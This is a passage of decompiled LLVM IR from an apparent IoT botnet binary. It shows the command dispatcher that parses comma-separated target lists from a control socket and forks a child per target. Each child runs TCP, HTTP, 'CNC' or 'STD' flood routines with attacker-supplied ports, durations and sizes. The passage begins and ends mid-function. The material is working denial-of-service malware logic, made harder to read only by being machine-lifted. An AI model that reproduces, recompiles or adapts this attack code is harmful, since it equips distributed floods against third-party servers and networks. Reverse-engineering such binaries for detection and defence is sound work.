  %v2_804ea7f = call i32 @sockprintf(i32 %v0_804ea6f, i32 ptrtoint ([186 x i8]* @global_var_805fca8.661 to i32))
  br label %dec_label_pc_804f27a

dec_label_pc_804ea89:                             ; preds = %dec_label_pc_804ea5b, %dec_label_pc_804ea55
  %v1_804ea8c = add i32 %tmp189, 4
  %v1_804ea8f = inttoptr i32 %v1_804ea8c to i32*
  %v2_804ea8f = load i32, i32* %v1_804ea8f, align 4
  store i1 %v5_804e9ff, i1* %cf.global-to-local, align 1
  %v2_804ea9a = load i32, i32* %v1_804ea02, align 4
  %v1_804ea9f = call i32 @atol(i32 %v2_804ea9a)
  store i1 %v5_804e9ea, i1* %cf.global-to-local, align 1
  %v2_804eaad = load i32, i32* %v1_804e9ed, align 4
  %v1_804eab2 = call i32 @atol(i32 %v2_804eaad)
  store i1 %v2_804ea14, i1* %cf.global-to-local, align 1
  %v2_804eac0 = load i32, i32* %v1_804ea17, align 4
  %v1_804eac5 = call i32 @atol(i32 %v2_804eac0)
  %v1_804ead0 = add i32 %tmp189, 20
  %v1_804ead3 = inttoptr i32 %v1_804ead0 to i32*
  %v2_804ead3 = load i32, i32* %v1_804ead3, align 4
  store i1 %v8_804ea55, i1* %cf.global-to-local, align 1
  br i1 %v1_804ea59, label %dec_label_pc_804eb00, label %dec_label_pc_804eade

dec_label_pc_804eade:                             ; preds = %dec_label_pc_804ea89
  %v1_804eae1 = add i32 %tmp189, 28
  %v5_804eae1 = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804eae1, i1* %cf.global-to-local, align 1
  %v1_804eae4 = inttoptr i32 %v1_804eae1 to i32*
  %v2_804eae4 = load i32, i32* %v1_804eae4, align 4
  %v1_804eae9 = call i32 @atol(i32 %v2_804eae4)
  br label %dec_label_pc_804eb00

dec_label_pc_804eb00:                             ; preds = %dec_label_pc_804ea89, %dec_label_pc_804eade
  %storemerge7 = phi i32 [ %v1_804eae9, %dec_label_pc_804eade ], [ 10, %dec_label_pc_804ea89 ]
  store i32 %storemerge7, i32* @esi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v7_804ea3f, label %dec_label_pc_804eb0f, label %dec_label_pc_804eb31

dec_label_pc_804eb0f:                             ; preds = %dec_label_pc_804eb00
  %v1_804eb12 = add i32 %tmp189, 24
  %v5_804eb12 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804eb12, i1* %cf.global-to-local, align 1
  %v1_804eb15 = inttoptr i32 %v1_804eb12 to i32*
  %v2_804eb15 = load i32, i32* %v1_804eb15, align 4
  %v1_804eb1a = call i32 @atol(i32 %v2_804eb15)
  br label %dec_label_pc_804eb31

dec_label_pc_804eb31:                             ; preds = %dec_label_pc_804eb00, %dec_label_pc_804eb0f
  %storemerge6 = phi i32 [ %v1_804eb1a, %dec_label_pc_804eb0f ], [ 0, %dec_label_pc_804eb00 ]
  store i32 %storemerge6, i32* @edi, align 4
  %v2_804eb48 = inttoptr i32 %v2_804ea8f to i8*
  %v3_804eb48 = call i32 @__GI_strchr(i8* %v2_804eb48, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eb4d = icmp eq i32 %v3_804eb48, 0
  br i1 %v1_804eb4d, label %dec_label_pc_804ebd6, label %dec_label_pc_804eb55

dec_label_pc_804eb55:                             ; preds = %dec_label_pc_804eb31
  store i32 %v2_804ea8f, i32* @eax, align 4
  %v2_804eb63 = call i32 @__GI_strtok(i32 %v2_804ea8f, i32 ptrtoint (i32* @global_var_80581b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ebce46 = icmp eq i32 %v2_804eb63, 0
  %v1_804ebd253 = icmp eq i1 %v4_804ebce46, false
  br i1 %v1_804ebd253, label %dec_label_pc_804eb6d, label %dec_label_pc_804ec20

dec_label_pc_804eb6d:                             ; preds = %dec_label_pc_804eb55, %dec_label_pc_804ebb7
  %storemerge1254 = phi i32 [ %v2_804ebc6, %dec_label_pc_804ebb7 ], [ %v2_804eb63, %dec_label_pc_804eb55 ]
  %v0_804eb6d = call i32 @listFork()
  store i32 %v0_804eb6d, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eb72 = icmp eq i32 %v0_804eb6d, 0
  %v1_804eb74 = icmp eq i1 %v1_804eb72, false
  br i1 %v1_804eb74, label %dec_label_pc_804ebb7, label %dec_label_pc_804eb76

dec_label_pc_804eb76:                             ; preds = %dec_label_pc_804eb6d
  %v7_804eba6 = inttoptr i32 %v2_804ead3 to i8*
  %v8_804eba6 = call i32 @sendTCP(i32 %storemerge1254, i32 %v1_804ea9f, i32 %v1_804eab2, i32 %v1_804eac5, i8* %v7_804eba6, i32 %storemerge6, i32 %storemerge7)
  %v1_804ebb2 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ebb7:                             ; preds = %dec_label_pc_804eb6d
  %v2_804ebc6 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80581b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ebce = icmp eq i32 %v2_804ebc6, 0
  %v1_804ebd2 = icmp eq i1 %v4_804ebce, false
  br i1 %v1_804ebd2, label %dec_label_pc_804eb6d, label %dec_label_pc_804ec20

dec_label_pc_804ebd6:                             ; preds = %dec_label_pc_804eb31
  %v0_804ebd6 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ebdb = icmp eq i32 %v0_804ebd6, 0
  %v1_804ebdd = icmp eq i1 %v1_804ebdb, false
  br i1 %v1_804ebdd, label %dec_label_pc_804ec20, label %dec_label_pc_804ebdf

dec_label_pc_804ebdf:                             ; preds = %dec_label_pc_804ebd6
  %v7_804ec0f = inttoptr i32 %v2_804ead3 to i8*
  %v8_804ec0f = call i32 @sendTCP(i32 %v2_804ea8f, i32 %v1_804ea9f, i32 %v1_804eab2, i32 %v1_804eac5, i8* %v7_804ec0f, i32 %storemerge6, i32 %storemerge7)
  %v1_804ec1b = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ec20:                             ; preds = %dec_label_pc_804ebb7, %dec_label_pc_804eb55, %dec_label_pc_804ebd6, %dec_label_pc_804e992
  %v2_804ec23 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804ec40 = inttoptr i32 %v2_804ec23 to i8*
  store i32 %v2_804ec23, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805fd62.662 to i32), i32* @edi, align 4
  %v7_804ec52 = call i32 @_strncmp(i8* %v4_804ec40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805fd62.662, i32 0, i32 0), i32 5)
  %v8_804ec52 = urem i32 %v7_804ec52, 2
  %v9_804ec52 = icmp eq i32 %v8_804ec52, 0
  %v0_804ec54 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ec54 = or i1 %v0_804ec54, %v9_804ec52
  %v3_804ec54 = zext i1 %v2_804ec54 to i32
  %v4_804ec54 = load i32, i32* @edx, align 4
  %v5_804ec54 = and i32 %v4_804ec54, -256
  %v6_804ec54 = or i32 %v3_804ec54, %v5_804ec54
  %v7_804ec54 = xor i32 %v6_804ec54, 1
  store i32 %v7_804ec54, i32* @edx, align 4
  %v3_804ec5a = and i32 %v7_804ec52, -256
  %v1_804ec5c = trunc i32 %v7_804ec54 to i8
  %v3_804ec5c = zext i1 %v0_804ec54 to i8
  %v4_804ec5c = sub nsw i8 %v1_804ec5c, %v3_804ec5c
  %v15_804ec5c = icmp eq i8 %v4_804ec5c, 0
  %v20_804ec5c = zext i8 %v4_804ec5c to i32
  %v23_804ec5c = or i32 %v20_804ec5c, %v3_804ec5a
  store i32 %v23_804ec5c, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ec65 = icmp eq i1 %v15_804ec5c, false
  br i1 %v1_804ec65, label %dec_label_pc_804edeb, label %dec_label_pc_804ec6b

dec_label_pc_804ec6b:                             ; preds = %dec_label_pc_804ec20
  %v2_804ec60 = sext i8 %v4_804ec5c to i32
  %v9_804ec6b = icmp ult i32 %arg1, 5
  store i1 %v9_804ec6b, i1* %cf.global-to-local, align 1
  %v7_804ec6f = icmp sgt i32 %arg1, 5
  br i1 %v7_804ec6f, label %dec_label_pc_804ec75, label %dec_label_pc_804f27a

dec_label_pc_804ec75:                             ; preds = %dec_label_pc_804ec6b
  %v1_804ec78 = add i32 %tmp189, 4
  %v5_804ec78 = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_804ec78, i1* %cf.global-to-local, align 1
  %v1_804ec7b = inttoptr i32 %v1_804ec78 to i32*
  %v2_804ec7b = load i32, i32* %v1_804ec7b, align 4
  %v2_804ec88 = inttoptr i32 %v2_804ec7b to i8*
  %v3_804ec88 = call i32 @__GI_strchr(i8* %v2_804ec88, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ec8d = icmp eq i32 %v3_804ec88, 0
  br i1 %v1_804ec8d, label %dec_label_pc_804ed61, label %dec_label_pc_804ec95

dec_label_pc_804ec95:                             ; preds = %dec_label_pc_804ec75
  store i1 %v5_804ec78, i1* %cf.global-to-local, align 1
  %v2_804ec9b = load i32, i32* %v1_804ec7b, align 4
  store i32 %v2_804ec9b, i32* @eax, align 4
  %v2_804eca8 = call i32 @__GI_strtok(i32 %v2_804ec9b, i32 ptrtoint (i32* @global_var_80581b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ed5238 = icmp eq i32 %v2_804eca8, 0
  %v1_804ed5645 = icmp eq i1 %v4_804ed5238, false
  br i1 %v1_804ed5645, label %dec_label_pc_804ecb5, label %dec_label_pc_804edeb

dec_label_pc_804ecb5:                             ; preds = %dec_label_pc_804ec95, %dec_label_pc_804ed3b
  %v0_804ecb5 = call i32 @listFork()
  store i32 %v0_804ecb5, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ecba = icmp eq i32 %v0_804ecb5, 0
  %v1_804ecbc = icmp eq i1 %v1_804ecba, false
  br i1 %v1_804ecbc, label %dec_label_pc_804ed3b, label %dec_label_pc_804ecbe

dec_label_pc_804ecbe:                             ; preds = %dec_label_pc_804ecb5
  %v1_804ecc1 = add i32 %tmp189, 24
  %v5_804ecc1 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804ecc1, i1* %cf.global-to-local, align 1
  %v1_804ecc4 = inttoptr i32 %v1_804ecc1 to i32*
  %v2_804ecc4 = load i32, i32* %v1_804ecc4, align 4
  %v1_804ecc9 = call i32 @atol(i32 %v2_804ecc4)
  store i32 %v1_804ecc9, i32* @ebx, align 4
  %v1_804ecd3 = add i32 %tmp189, 20
  %v5_804ecd3 = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_804ecd3, i1* %cf.global-to-local, align 1
  %v1_804ecd6 = inttoptr i32 %v1_804ecd3 to i32*
  %v2_804ecd6 = load i32, i32* %v1_804ecd6, align 4
  %v1_804ecdb = call i32 @atol(i32 %v2_804ecd6)
  store i32 %v1_804ecdb, i32* @esi, align 4
  %v1_804ece5 = add i32 %tmp189, 16
  %v1_804ece8 = inttoptr i32 %v1_804ece5 to i32*
  %v2_804ece8 = load i32, i32* %v1_804ece8, align 4
  store i32 %v2_804ece8, i32* @edi, align 4
  %v1_804ecef = add i32 %tmp189, 12
  %v5_804ecef = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804ecef, i1* %cf.global-to-local, align 1
  %v1_804ecf2 = inttoptr i32 %v1_804ecef to i32*
  %v2_804ecf2 = load i32, i32* %v1_804ecf2, align 4
  %v1_804ecf7 = call i32 @atol(i32 %v2_804ecf2)
  %v1_804ecfc = urem i32 %v1_804ecf7, 65536
  store i32 %v1_804ecfc, i32* %edx.global-to-local, align 4
  %v1_804ed04 = add i32 %tmp189, 8
  %v1_804ed07 = inttoptr i32 %v1_804ed04 to i32*
  %v2_804ed07 = load i32, i32* %v1_804ed07, align 4
  store i1 %v5_804ec78, i1* %cf.global-to-local, align 1
  %v2_804ed11 = load i32, i32* %v1_804ec7b, align 4
  %v0_804ed13 = load i32, i32* @ebx, align 4
  %v0_804ed17 = load i32, i32* @esi, align 4
  %v0_804ed1b = load i32, i32* @edi, align 4
  %v6_804ed2a = trunc i32 %v1_804ecf7 to i16
  %v7_804ed2a = call i32 @sendHTTP(i32 %v2_804ed11, i32 %v2_804ed07, i16 %v6_804ed2a, i32 %v0_804ed1b, i32 %v0_804ed17, i32 %v0_804ed13)
  %v1_804ed36 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ed3b:                             ; preds = %dec_label_pc_804ecb5
  %v2_804ed4a = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80581b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ed52 = icmp eq i32 %v2_804ed4a, 0
  %v1_804ed56 = icmp eq i1 %v4_804ed52, false
  br i1 %v1_804ed56, label %dec_label_pc_804ecb5, label %dec_label_pc_804edeb

dec_label_pc_804ed61:                             ; preds = %dec_label_pc_804ec75
  %v0_804ed61 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ed66 = icmp eq i32 %v0_804ed61, 0
  %v1_804ed68 = icmp eq i1 %v1_804ed66, false
  br i1 %v1_804ed68, label %dec_label_pc_804f27a, label %dec_label_pc_804ed6e

dec_label_pc_804ed6e:                             ; preds = %dec_label_pc_804ed61
  %v1_804ed71 = add i32 %tmp189, 24
  %v5_804ed71 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804ed71, i1* %cf.global-to-local, align 1
  %v1_804ed74 = inttoptr i32 %v1_804ed71 to i32*
  %v2_804ed74 = load i32, i32* %v1_804ed74, align 4
  %v1_804ed79 = call i32 @atol(i32 %v2_804ed74)
  store i32 %v1_804ed79, i32* @ebx, align 4
  %v1_804ed83 = add i32 %tmp189, 20
  %v5_804ed83 = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_804ed83, i1* %cf.global-to-local, align 1
  %v1_804ed86 = inttoptr i32 %v1_804ed83 to i32*
  %v2_804ed86 = load i32, i32* %v1_804ed86, align 4
  %v1_804ed8b = call i32 @atol(i32 %v2_804ed86)
  store i32 %v1_804ed8b, i32* @esi, align 4
  %v1_804ed95 = add i32 %tmp189, 16
  %v1_804ed98 = inttoptr i32 %v1_804ed95 to i32*
  %v2_804ed98 = load i32, i32* %v1_804ed98, align 4
  store i32 %v2_804ed98, i32* @edi, align 4
  %v1_804ed9f = add i32 %tmp189, 12
  %v5_804ed9f = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804ed9f, i1* %cf.global-to-local, align 1
  %v1_804eda2 = inttoptr i32 %v1_804ed9f to i32*
  %v2_804eda2 = load i32, i32* %v1_804eda2, align 4
  %v1_804eda7 = call i32 @atol(i32 %v2_804eda2)
  %v1_804edac = urem i32 %v1_804eda7, 65536
  store i32 %v1_804edac, i32* %edx.global-to-local, align 4
  %v1_804edb4 = add i32 %tmp189, 8
  %v1_804edb7 = inttoptr i32 %v1_804edb4 to i32*
  %v2_804edb7 = load i32, i32* %v1_804edb7, align 4
  store i1 %v5_804ec78, i1* %cf.global-to-local, align 1
  %v2_804edc1 = load i32, i32* %v1_804ec7b, align 4
  %v0_804edc3 = load i32, i32* @ebx, align 4
  %v0_804edc7 = load i32, i32* @esi, align 4
  %v0_804edcb = load i32, i32* @edi, align 4
  %v6_804edda = trunc i32 %v1_804eda7 to i16
  %v7_804edda = call i32 @sendHTTP(i32 %v2_804edc1, i32 %v2_804edb7, i16 %v6_804edda, i32 %v0_804edcb, i32 %v0_804edc7, i32 %v0_804edc3)
  %v1_804ede6 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804edeb:                             ; preds = %dec_label_pc_804ed3b, %dec_label_pc_804ec95, %dec_label_pc_804ec20
  %v2_804edee = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804ee0b = inttoptr i32 %v2_804edee to i8*
  store i32 %v2_804edee, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805fd67.663 to i32), i32* @edi, align 4
  %v7_804ee1d = call i32 @_strncmp(i8* %v4_804ee0b, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805fd67.663, i32 0, i32 0), i32 4)
  %v8_804ee1d = urem i32 %v7_804ee1d, 2
  %v9_804ee1d = icmp eq i32 %v8_804ee1d, 0
  %v0_804ee1f = load i1, i1* %cf.global-to-local, align 1
  %v2_804ee1f = or i1 %v0_804ee1f, %v9_804ee1d
  %v3_804ee1f = zext i1 %v2_804ee1f to i32
  %v4_804ee1f = load i32, i32* @edx, align 4
  %v5_804ee1f = and i32 %v4_804ee1f, -256
  %v6_804ee1f = or i32 %v3_804ee1f, %v5_804ee1f
  %v7_804ee1f = xor i32 %v6_804ee1f, 1
  store i32 %v7_804ee1f, i32* @edx, align 4
  %v1_804ee27 = trunc i32 %v7_804ee1f to i8
  %v3_804ee27 = zext i1 %v0_804ee1f to i8
  %v15_804ee27 = icmp eq i8 %v1_804ee27, %v3_804ee27
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ee30 = icmp eq i1 %v15_804ee27, false
  br i1 %v1_804ee30, label %dec_label_pc_804ef6a, label %dec_label_pc_804ee36

dec_label_pc_804ee36:                             ; preds = %dec_label_pc_804edeb
  %v9_804ee36 = icmp ult i32 %arg1, 3
  store i1 %v9_804ee36, i1* %cf.global-to-local, align 1
  %v7_804ee3a = icmp sgt i32 %arg1, 3
  br i1 %v7_804ee3a, label %dec_label_pc_804ee3c, label %dec_label_pc_804ee64

dec_label_pc_804ee3c:                             ; preds = %dec_label_pc_804ee36
  %v1_804ee3f = add i32 %tmp189, 8
  %v5_804ee3f = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804ee3f, i1* %cf.global-to-local, align 1
  %v1_804ee42 = inttoptr i32 %v1_804ee3f to i32*
  %v2_804ee42 = load i32, i32* %v1_804ee42, align 4
  %v1_804ee47 = call i32 @atol(i32 %v2_804ee42)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp200 = icmp slt i32 %v1_804ee47, 1
  br i1 %tmp200, label %dec_label_pc_804ee64, label %dec_label_pc_804ee50

dec_label_pc_804ee50:                             ; preds = %dec_label_pc_804ee3c
  %v1_804ee53 = add i32 %tmp189, 12
  %v5_804ee53 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804ee53, i1* %cf.global-to-local, align 1
  %v1_804ee56 = inttoptr i32 %v1_804ee53 to i32*
  %v2_804ee56 = load i32, i32* %v1_804ee56, align 4
  %v1_804ee5b = call i32 @atol(i32 %v2_804ee56)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp201 = icmp slt i32 %v1_804ee5b, 1
  %tmp202 = icmp eq i1 %tmp201, false
  br i1 %tmp202, label %dec_label_pc_804ee7e, label %dec_label_pc_804ee64

dec_label_pc_804ee64:                             ; preds = %dec_label_pc_804ee36, %dec_label_pc_804ee50, %dec_label_pc_804ee3c
  %v0_804ee64 = load i32, i32* @global_var_8062580.20, align 128
  %v2_804ee74 = call i32 @sockprintf(i32 %v0_804ee64, i32 ptrtoint ([27 x i8]* @global_var_805fd6b.664 to i32))
  br label %dec_label_pc_804f27a

dec_label_pc_804ee7e:                             ; preds = %dec_label_pc_804ee50
  %v1_804ee81 = add i32 %tmp189, 4
  %v1_804ee84 = inttoptr i32 %v1_804ee81 to i32*
  %v2_804ee84 = load i32, i32* %v1_804ee84, align 4
  store i1 %v5_804ee3f, i1* %cf.global-to-local, align 1
  %v2_804ee8f = load i32, i32* %v1_804ee42, align 4
  %v1_804ee94 = call i32 @atol(i32 %v2_804ee8f)
  store i1 %v5_804ee53, i1* %cf.global-to-local, align 1
  %v2_804eea2 = load i32, i32* %v1_804ee56, align 4
  %v1_804eea7 = call i32 @atol(i32 %v2_804eea2)
  %v2_804eebd = inttoptr i32 %v2_804ee84 to i8*
  %v3_804eebd = call i32 @__GI_strchr(i8* %v2_804eebd, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eec2 = icmp eq i32 %v3_804eebd, 0
  br i1 %v1_804eec2, label %dec_label_pc_804ef38, label %dec_label_pc_804eec6

dec_label_pc_804eec6:                             ; preds = %dec_label_pc_804ee7e
  store i32 %v2_804ee84, i32* @eax, align 4
  %v2_804eed4 = call i32 @__GI_strtok(i32 %v2_804ee84, i32 ptrtoint (i32* @global_var_80581b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ef3029 = icmp eq i32 %v2_804eed4, 0
  %v1_804ef3436 = icmp eq i1 %v4_804ef3029, false
  br i1 %v1_804ef3436, label %dec_label_pc_804eede, label %dec_label_pc_804ef6a

dec_label_pc_804eede:                             ; preds = %dec_label_pc_804eec6, %dec_label_pc_804ef19
  %storemerge1437 = phi i32 [ %v2_804ef28, %dec_label_pc_804ef19 ], [ %v2_804eed4, %dec_label_pc_804eec6 ]
  %v0_804eede = call i32 @listFork()
  store i32 %v0_804eede, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804eee3 = icmp eq i32 %v0_804eede, 0
  %v1_804eee5 = icmp eq i1 %v1_804eee3, false
  br i1 %v1_804eee5, label %dec_label_pc_804ef19, label %dec_label_pc_804eee7

dec_label_pc_804eee7:                             ; preds = %dec_label_pc_804eede
  %v3_804eefb = call i32 @sendCNC(i32 %storemerge1437, i32 %v1_804ee94, i32 %v1_804eea7)
  %v0_804ef00 = load i32, i32* @global_var_8062580.20, align 128
  %v1_804ef08 = call i32 @__libc_close(i32 %v0_804ef00)
  %v1_804ef14 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ef19:                             ; preds = %dec_label_pc_804eede
  %v2_804ef28 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80581b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ef30 = icmp eq i32 %v2_804ef28, 0
  %v1_804ef34 = icmp eq i1 %v4_804ef30, false
  br i1 %v1_804ef34, label %dec_label_pc_804eede, label %dec_label_pc_804ef6a

dec_label_pc_804ef38:                             ; preds = %dec_label_pc_804ee7e
  %v0_804ef38 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ef3d = icmp eq i32 %v0_804ef38, 0
  %v1_804ef3f = icmp eq i1 %v1_804ef3d, false
  br i1 %v1_804ef3f, label %dec_label_pc_804f27a, label %dec_label_pc_804ef45

dec_label_pc_804ef45:                             ; preds = %dec_label_pc_804ef38
  %v3_804ef59 = call i32 @sendCNC(i32 %v2_804ee84, i32 %v1_804ee94, i32 %v1_804eea7)
  %v1_804ef65 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ef6a:                             ; preds = %dec_label_pc_804ef19, %dec_label_pc_804eec6, %dec_label_pc_804edeb
  %v2_804ef6d = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804ef8a = inttoptr i32 %v2_804ef6d to i8*
  store i32 %v2_804ef6d, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805fd86.665 to i32), i32* @edi, align 4
  %v7_804ef9c = call i32 @_strncmp(i8* %v4_804ef8a, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805fd86.665, i32 0, i32 0), i32 4)
  %v8_804ef9c = urem i32 %v7_804ef9c, 2
  %v9_804ef9c = icmp eq i32 %v8_804ef9c, 0
  %v0_804ef9e = load i1, i1* %cf.global-to-local, align 1
  %v2_804ef9e = or i1 %v0_804ef9e, %v9_804ef9c
  %v3_804ef9e = zext i1 %v2_804ef9e to i32
  %v4_804ef9e = load i32, i32* @edx, align 4
  %v5_804ef9e = and i32 %v4_804ef9e, -256
  %v6_804ef9e = or i32 %v3_804ef9e, %v5_804ef9e
  %v7_804ef9e = xor i32 %v6_804ef9e, 1
  store i32 %v7_804ef9e, i32* @edx, align 4
  %v1_804efa6 = trunc i32 %v7_804ef9e to i8
  %v3_804efa6 = zext i1 %v0_804ef9e to i8
  %v15_804efa6 = icmp eq i8 %v1_804efa6, %v3_804efa6
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804efaf = icmp eq i1 %v15_804efa6, false
  br i1 %v1_804efaf, label %dec_label_pc_804f0dc, label %dec_label_pc_804efb5

dec_label_pc_804efb5:                             ; preds = %dec_label_pc_804ef6a
  %v9_804efb5 = icmp ult i32 %arg1, 3
  store i1 %v9_804efb5, i1* %cf.global-to-local, align 1
  %v7_804efb9 = icmp sgt i32 %arg1, 3
  br i1 %v7_804efb9, label %dec_label_pc_804efbb, label %dec_label_pc_804efe3

dec_label_pc_804efbb:                             ; preds = %dec_label_pc_804efb5
  %v1_804efbe = add i32 %tmp189, 8
  %v5_804efbe = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804efbe, i1* %cf.global-to-local, align 1
  %v1_804efc1 = inttoptr i32 %v1_804efbe to i32*
  %v2_804efc1 = load i32, i32* %v1_804efc1, align 4
  %v1_804efc6 = call i32 @atol(i32 %v2_804efc1)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp203 = icmp slt i32 %v1_804efc6, 1
  br i1 %tmp203, label %dec_label_pc_804efe3, label %dec_label_pc_804efcf

dec_label_pc_804efcf:                             ; preds = %dec_label_pc_804efbb
  %v1_804efd2 = add i32 %tmp189, 12
  %v5_804efd2 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804efd2, i1* %cf.global-to-local, align 1
  %v1_804efd5 = inttoptr i32 %v1_804efd2 to i32*
  %v2_804efd5 = load i32, i32* %v1_804efd5, align 4
  %v1_804efda = call i32 @atol(i32 %v2_804efd5)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp204 = icmp slt i32 %v1_804efda, 1
  %tmp205 = icmp eq i1 %tmp204, false
  br i1 %tmp205, label %dec_label_pc_804effd, label %dec_label_pc_804efe3

dec_label_pc_804efe3:                             ; preds = %dec_label_pc_804efb5, %dec_label_pc_804efcf, %dec_label_pc_804efbb
  %v0_804efe3 = load i32, i32* @global_var_8062580.20, align 128
  %v2_804eff3 = call i32 @sockprintf(i32 %v0_804efe3, i32 ptrtoint ([27 x i8]* @global_var_805fd8a.666 to i32))
  br label %dec_label_pc_804f27a

dec_label_pc_804effd:                             ; preds = %dec_label_pc_804efcf
  %v1_804f000 = add i32 %tmp189, 4
  %v1_804f003 = inttoptr i32 %v1_804f000 to i32*
  %v2_804f003 = load i32, i32* %v1_804f003, align 4
  store i1 %v5_804efbe, i1* %cf.global-to-local, align 1
  %v2_804f00e = load i32, i32* %v1_804efc1, align 4
  %v1_804f013 = call i32 @atol(i32 %v2_804f00e)
  store i1 %v5_804efd2, i1* %cf.global-to-local, align 1
  %v2_804f021 = load i32, i32* %v1_804efd5, align 4
  %v1_804f026 = call i32 @atol(i32 %v2_804f021)
  %v2_804f03c = inttoptr i32 %v2_804f003 to i8*
  %v3_804f03c = call i32 @__GI_strchr(i8* %v2_804f03c, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f041 = icmp eq i32 %v3_804f03c, 0
  br i1 %v1_804f041, label %dec_label_pc_804f0aa, label %dec_label_pc_804f045

dec_label_pc_804f045:                             ; preds = %dec_label_pc_804effd
  store i32 %v2_804f003, i32* @eax, align 4
  %v2_804f053 = call i32 @__GI_strtok(i32 %v2_804f003, i32 ptrtoint (i32* @global_var_80581b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f0a220 = icmp eq i32 %v2_804f053, 0
  %v1_804f0a627 = icmp eq i1 %v4_804f0a220, false
  br i1 %v1_804f0a627, label %dec_label_pc_804f05d, label %dec_label_pc_804f0dc

dec_label_pc_804f05d:                             ; preds = %dec_label_pc_804f045, %dec_label_pc_804f08b
  %storemerge1528 = phi i32 [ %v2_804f09a, %dec_label_pc_804f08b ], [ %v2_804f053, %dec_label_pc_804f045 ]
  %v0_804f05d = call i32 @listFork()
  store i32 %v0_804f05d, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f062 = icmp eq i32 %v0_804f05d, 0
  %v1_804f064 = icmp eq i1 %v1_804f062, false
  br i1 %v1_804f064, label %dec_label_pc_804f08b, label %dec_label_pc_804f066

dec_label_pc_804f066:                             ; preds = %dec_label_pc_804f05d
  %v3_804f07a = call i32 @sendSTD(i32 %storemerge1528, i32 %v1_804f013, i32 %v1_804f026)
  %v1_804f086 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f08b:                             ; preds = %dec_label_pc_804f05d
  %v2_804f09a = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80581b1.223 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f0a2 = icmp eq i32 %v2_804f09a, 0
  %v1_804f0a6 = icmp eq i1 %v4_804f0a2, false
  br i1 %v1_804f0a6, label %dec_label_pc_804f05d, label %dec_label_pc_804f0dc

dec_label_pc_804f0aa:                             ; preds = %dec_label_pc_804effd
  %v0_804f0aa = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f0af = icmp eq i32 %v0_804f0aa, 0
  %v1_804f0b1 = icmp eq i1 %v1_804f0af, false
  br i1 %v1_804f0b1, label %dec_label_pc_804f27a, label %dec_label_pc_804f0b7

dec_label_pc_804f0b7:                             ; preds = %dec_label_pc_804f0aa
